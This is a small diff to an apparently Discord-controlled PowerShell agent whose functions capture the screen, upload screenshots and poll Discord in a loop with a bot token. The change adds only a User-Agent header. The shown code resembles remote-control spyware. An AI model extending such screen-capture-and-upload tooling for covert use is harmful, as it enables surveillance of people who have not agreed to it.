@@ -38,6 +38,7 @@ function Send-Screenshot {
         $file = Capture-Screen
         $client = New-Object System.Net.Http.HttpClient
         try {
+            $client.DefaultRequestHeaders.UserAgent.ParseAdd('DiscordAgent/1.0')
             $form = New-Object System.Net.Http.MultipartFormDataContent
             $stream = [System.IO.File]::OpenRead($file)
             try {
@@ -59,7 +60,7 @@ function Send-Screenshot {
 }
 
 function Start-BotLoop {
-    $head = @{ Authorization = "Bot $($Config.BotToken)" }
+    $head = @{ Authorization = "Bot $($Config.BotToken)"; 'User-Agent' = 'DiscordAgent/1.0' }
     $lastSeen = $null
     while ($true) {
         try {
